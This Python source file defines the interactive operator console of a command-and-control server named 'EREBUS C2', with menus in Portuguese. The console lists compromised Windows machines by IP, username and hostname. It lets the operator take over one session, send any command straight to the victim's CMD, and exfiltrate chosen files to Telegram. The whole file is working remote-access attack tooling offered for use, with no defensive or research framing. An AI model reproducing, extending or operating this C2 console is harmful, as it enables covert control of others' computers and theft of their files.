class C2Console:
    def __init__(self, dispatcher, transport):
        self.dispatcher = dispatcher
        self.transport = transport
        self.active_session = None  # Armazena qual ID está sendo controlado no momento
    def start_loop(self):
        print("\n=============================================================")
        print("       E R E B U S   C 2   -   MENU INTERATIVO DIRETO        ")
        print("=============================================================")
        print("Comandos Globais:")
        print("  list               - Lista todos os computadores ativos")
        print("  interact <ID>      - Entra no modo de controle direto do PC")
        print("  status             - Exibe a porta de escuta do servidor")
        print("  exit               - Encerra o servidor C2\n")
        print("Comandos dentro da Sessão (Apenas após dar 'interact'):")
        print("  back               - Sai do controle direto e volta ao menu principal")
        print("  ls                 - Atalho nativo para listar e exibir no painel")
        print("  exfiltrar <path>   - Atalho nativo para enviar um arquivo ao Telegram")
        print("  <qualquer outro>   - Enviado direto para o CMD do Windows alvo\n")
        while True:
            try:
                if self.active_session is None:
                    prompt = "C2_Admin> "
                else:
                    prompt = f"C2_Admin [SESSÃO-{self.active_session}]> "
                cmd_input = input(prompt).strip()
                if not cmd_input: continue
                if self.active_session is None:
                    parts = cmd_input.split(" ")
                    base_cmd = parts[0].lower()
                    if base_cmd == "exit":
                        break
                    elif base_cmd == "status":
                        print(f"[*] Servidor operando na porta {self.transport.port}")
                    elif base_cmd == "list":
                        print(f"\n[*] Clientes conectados: {len(self.transport.sessions)}")
                        if self.transport.sessions:
                            print("-" * 65)
                            print(f"{'ID':<4} | {'ENDEREÇO IP':<18} | {'IDENTIFICAÇÃO ALVO':<40}")
                            print("-" * 65)
                            for sid, data in self.transport.sessions.items():
                                alvo_str = f"{data['username']}@{data['hostname']}"
                                print(f"{sid:<4} | {data['addr'][0]}:{data['addr'][1]:<5} | {alvo_str:<40}")
                        print("")
                    elif base_cmd == "interact":
                        try:
                            sid = int(parts[1])
                            if sid in self.transport.sessions:
                                self.active_session = sid
                                print(f"[*] Interagindo diretamente com o ID [{sid}]. Digite 'back' para sair.")
                            else:
                                print("[!] ID inválido ou offline.")
                        except:
                            print("[!] Formato incorreto. Use: interact <ID>")
                    else:
                        print("[!] Comando inválido no menu principal. Digite 'list' ou 'interact <ID>'")
                else:
                    cmd_lower = cmd_input.lower().strip()
                    if cmd_lower == "back":
                        self.active_session = None
                        print("[*] Voltando ao menu principal C2_Admin.")
                        continue
                    if cmd_lower == "ls" or cmd_lower == "dir":
                        print("[*] Solicitando listagem nativa de arquivos...")
                        res = self.dispatcher.process(self.active_session, "ls")
                        print(f"[+] Resposta: {res.get('data', res)}")
                    elif cmd_lower.startswith("exfiltrar "):
                        caminho_arquivo = cmd_input[10:].strip()
                        res = self.dispatcher.exfiltrar_para_telegram(self.active_session, caminho_arquivo)
                        print(f"[+] Resposta: {res.get('data', res.get('message', res))}")
                    else:
                        res = self.dispatcher.process(self.active_session, cmd_input)
                        print(f"\n[+] Retorno do CMD:\n{res.get('data', res.get('message', res))}\n")
            except (KeyboardInterrupt, EOFError):
                print("\n[*] Retornando ao Menu Principal...")
                self.active_session = None
            except Exception as e:
                print(f"[!] Erro na interface: {e}")
